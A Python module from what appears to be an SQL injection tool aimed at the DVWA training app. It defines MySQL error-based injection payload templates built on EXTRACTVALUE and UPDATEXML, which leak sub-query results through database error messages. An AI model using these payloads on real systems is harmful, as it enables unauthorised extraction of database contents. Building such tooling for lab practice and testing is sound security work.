"""
payloads/error_based.py — Error-based injection payload templates (Phase 3 & 4)

Purpose:
  Payloads that force the DB engine to embed query results inside an error
  message, which is then reflected in the HTTP response body.

MySQL techniques:
  - EXTRACTVALUE(1, CONCAT(0x7e, ({QUERY})))
  - UPDATEXML(1, CONCAT(0x7e, ({QUERY})), 1)

SQLite techniques:
  - SQLite does not support error-based injection natively.
    Fall back to Union-based or Boolean-based for SQLite targets.

Placeholder convention:
  {QUERY} → replaced at runtime with the actual SELECT sub-query

Expected exports:
  MYSQL_ERROR_PAYLOADS  : list[str]   — template strings with {QUERY}
  SQLITE_ERROR_PAYLOADS : list[str]   — empty list (not applicable)
"""

# MySQL error-based payloads.
# {QUERY} is replaced at runtime with the target SELECT sub-query, e.g.:
#   "SELECT DATABASE()"  →  "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE())))-- -"
#
# EXTRACTVALUE forces MySQL to raise an XPath error that includes the
# query result in the error message, which DVWA then reflects in the HTML.
# UPDATEXML achieves the same effect through a different XML function path.
MYSQL_ERROR_PAYLOADS: list[str] = [
    "1' AND EXTRACTVALUE(1,CONCAT(0x7e,({QUERY})))-- -",
    "1' AND UPDATEXML(1,CONCAT(0x7e,({QUERY})),1)-- -",
]

# SQLite does not expose query results through error messages in the same way.
# The extractor falls back to UNION-based payloads for SQLite targets.
SQLITE_ERROR_PAYLOADS: list[str] = []